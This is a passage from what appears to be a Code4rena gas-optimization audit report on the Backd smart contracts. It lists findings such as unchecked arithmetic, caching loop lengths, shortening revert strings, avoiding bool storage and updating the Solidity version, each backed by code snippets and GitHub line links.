IERC20(token).balanceOf(address(this));\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L331\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #9\r\n\r\n376         uint256 oldBal = IERC20(token).balanceOf(address(this));\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L376\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #10\r\n\r\n173             _allowances[src][spender] = allowanceNew;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L173\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #11\r\n\r\n388             _allowances[src][msg.sender] -= unstaked;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L388\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #12\r\n\r\n60         _balances[msg.sender][token] += received;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L60\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol   #13\r\n\r\n77         _balances[msg.sender][token] -= amount;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L77\r\n\r\n### 5. ` += ` costs more gas than ` = + ` for state variables\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #1\r\n\r\n344             strategiesTotalStaked += staked;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L344\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #2\r\n\r\n346             _poolTotalStaked += staked;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L346\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #3\r\n\r\n393             strategiesTotalStaked -= unstaked;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L393\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #4\r\n\r\n395             _poolTotalStaked -= unstaked;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L395\r\n\r\n### 6. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()`\r\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #1\r\n\r\n76             require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L76\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #2\r\n\r\n163         uint256 allowanceNew = startingAllowance - amount;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L163\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #3\r\n\r\n164         uint256 srcTokensNew = srcTokens - amount;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L164\r\n\r\n### 7. `.length` should not be looked up in every loop of a `for`-loop\r\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length. Storage array length checks incur an extra Gwarmaccess (100 gas) PER-LOOP.\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n80         for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L80\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n135         for (uint256 i = 0; i < assets.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L135\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #3\r\n\r\n61         for (uint256 i = 0; i < ctokens.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L61\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n188         for (uint256 i = 0; i < protocols.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L188\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #5\r\n\r\n43             for (uint256 i = 0; i < users.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L43\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #6\r\n\r\n46                 for (uint256 j = 0; j < positions.length; j++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L46\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #7\r\n\r\n72         for (uint256 i = 0; i < keys.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L72\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #8\r\n\r\n260         for (uint256 i = 0; i < actions.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L260\r\n\r\n### 8. `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n80         for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L80\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n135         for (uint256 i = 0; i < assets.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L135\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #3\r\n\r\n61         for (uint256 i = 0; i < ctokens.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L61\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n188         for (uint256 i = 0; i < protocols.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L188\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n456         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L456\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n479         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L479\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n506         for (uint256 i = 0; i < howMany; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L506\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #8\r\n\r\n891         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L891\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #9\r\n\r\n43             for (uint256 i = 0; i < users.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L43\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #10\r\n\r\n46                 for (uint256 j = 0; j < positions.length; j++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L46\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #11\r\n\r\n72         for (uint256 i = 0; i < keys.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L72\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #12\r\n\r\n93         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L93\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #13\r\n\r\n165         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L165\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #14\r\n\r\n117         for (uint256 i = 0; i < numActions; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L117\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #15\r\n\r\n260         for (uint256 i = 0; i < actions.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L260\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #16\r\n\r\n313         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L313\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #17\r\n\r\n380         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L380\r\n\r\n### 9. `require()`/`revert()` strings longer than 32 bytes cost extra gas\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n67         require(amountLeft == 0, Error.INSUFFICIENT_UPDATE_BALANCE);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L67\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n218         require(isUsable(record.depositToken), Error.TOKEN_NOT_USABLE);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L218\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n575         require(\r\n576             vars.estimatedRequiredWeiForGas <=\r\n577                 vars.estimatedRequiredGas * vars.userGasPrice + maxWeiForGas,\r\n578             Error.ESTIMATED_GAS_TOO_HIGH\r\n579         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L575-L579\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n583         require(\r\n584             vars.gasBankBalance + maxWeiForGas >= vars.estimatedRequiredWeiForGas,\r\n585             Error.GAS_BANK_BALANCE_TOO_LOW\r\n586         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L583-L586\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #5\r\n\r\n285         require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L285\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #6\r\n\r\n83         require(\r\n84             _spendRatio <= ICvxLocker(CVX_LOCKER).maximumBoostPayment(),\r\n85             Error.EXCEEDS_MAX_BOOST\r\n86         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L83-L86\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #7\r\n\r\n135             require(!prepareWithdrawal, Error.PREPARED_WITHDRAWAL);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L135\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #8\r\n\r\n137         require(ILpToken(_lpToken).minter() == address(this), Error.INVALID_MINTER);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L137\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #9\r\n\r\n400         require(depositCap != _depositCap, Error.SAME_AS_CURRENT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L400\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #10\r\n\r\n562         require(redeemUnderlying >= minRedeemAmount, Error.NOT_ENOUGH_FUNDS_WITHDRAWN);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L562\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #11\r\n\r\n159         require(vars.poolImplementation != address(0), Error.INVALID_POOL_IMPLEMENTATION);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L159\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #12\r\n\r\n162         require(vars.lpTokenImplementation != address(0), Error.INVALID_LP_TOKEN_IMPLEMENTATION);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L162\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #13\r\n\r\n165         require(vars.vaultImplementation != address(0), Error.INVALID_VAULT_IMPLEMENTATION);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L165\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #14\r\n\r\n170         require(\r\n171             vars.stakerVaultImplementation != address(0),\r\n172             Error.INVALID_STAKER_VAULT_IMPLEMENTATION\r\n173         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L170-L173\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #15\r\n\r\n180             require(\r\n181                 ILiquidityPool(vars.poolImplementation).getUnderlying() == address(0),\r\n182                 Error.INVALID_POOL_IMPLEMENTATION\r\n183             );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L180-L183\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #16\r\n\r\n110         require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L110\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #17\r\n\r\n165         require(IPausable(pool).isPaused(), Error.POOL_NOT_PAUSED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L165\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #18\r\n\r\n762         require(\r\n763             reserveFee + strategistFee <= ScaledMath.ONE,\r\n764             \"sum of strategist fee and reserve fee should be below 1\"\r\n765         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L762-L765\r\n\r\n### 10. Not using the named return variables when a function returns, wastes deployment gas\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n500         if (cursor >= length) return (new address[](0), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L500\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n510         return (usersWithPositions_, cursor + howMany);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L510\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n500         if (cursor >= length) return (new address[](0), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L500\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n510         return (usersWithPositions_, cursor + howMany);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L510\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n763         return topUpHandler.getUserFactor(account, extra);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L763\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #6\r\n\r\n42             if (users.length == 0) return (_shortenTopups(executableTopups, topupsAdded), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L42\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #7\r\n\r\n52                     if (topupsAdded == howMany) return (executableTopups, cursor + i + offset);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L52\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #8\r\n\r\n42             if (users.length == 0) return (_shortenTopups(executableTopups, topupsAdded), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L42\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #9\r\n\r\n52                     if (topupsAdded == howMany) return (executableTopups, cursor + i + offset);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L52\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #10\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #11\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #12\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #13\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #14\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #15\r\n\r\n303         return curvePool_.coins(1) == token_ ? (0, 1) : (1, 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L303\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #16\r\n\r\n303         return curvePool_.coins(1) == token_ ? (0, 1) : (1, 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L303\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #17\r\n\r\n317         return\r\n318             wethAmount_\r\n319                 .scaledDiv(_addressProvider.getOracleProvider().getPriceETH(token_))\r\n320                 .scaledMul(slippageTolerance) / _decimalMultiplier(token_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L317-L320\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #18\r\n\r\n334         return\r\n335             tokenAmount_\r\n336                 .scaledMul(_addressProvider.getOracleProvider().getPriceETH(token_))\r\n337                 .scaledMul(slippageTolerance) * _decimalMultiplier(token_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L334-L337\r\n\r\n### 11. Using `bool`s for storage incurs overhead\r\n```solidity\r\n    // Booleans are more expensive than uint256 or any type that takes up a full\r\n    // word because each write operation emits an extra SLOAD to first read the\r\n    // slot's contents, replace the bits taken up by the boolean, and then write\r\n    // back. This is the compiler's defense against contract upgrades and\r\n    // pointer aliasing, and it cannot be disabled.\r\n```\r\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\r\nUse `uint256(1)` and `uint256(2)` for true/false\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #1\r\n\r\n40     bool public prepareWithdrawal;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L40\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #2\r\n\r\n55     mapping(address => bool) public strategies;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L55\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #3\r\n\r\n48     bool public isShutdown; // If the strategy is shutdown, stops all deposits\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L48\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #4\r\n\r\n32     mapping(address => bool) public swapViaUniswap; // If Uniswap should be used over Sushiswap for swaps\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L32\r\n\r\n```solidity\r\nFile: contracts/utils/Pausable.sol   #5\r\n\r\n7     bool public isPaused;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Pausable.sol#L7\r\n\r\n```solidity\r\nFile: contracts/vault/VaultStorage.sol   #6\r\n\r\n14     bool public strategyActive;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultStorage.sol#L14\r\n\r\n### 12. Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\r\n\r\n```solidity\r\nFile: contracts/access/AuthorizationBase.sol   #1\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/AuthorizationBase.sol#L2\r\n\r\n```solidity\r\nFile: contracts/access/Authorization.sol   #2\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/Authorization.sol#L2\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #3\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #4\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/BaseHandler.sol   #5\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/BaseHandler.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #6\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #7\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #8\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #9\r\n\r\n2 pragma solidity 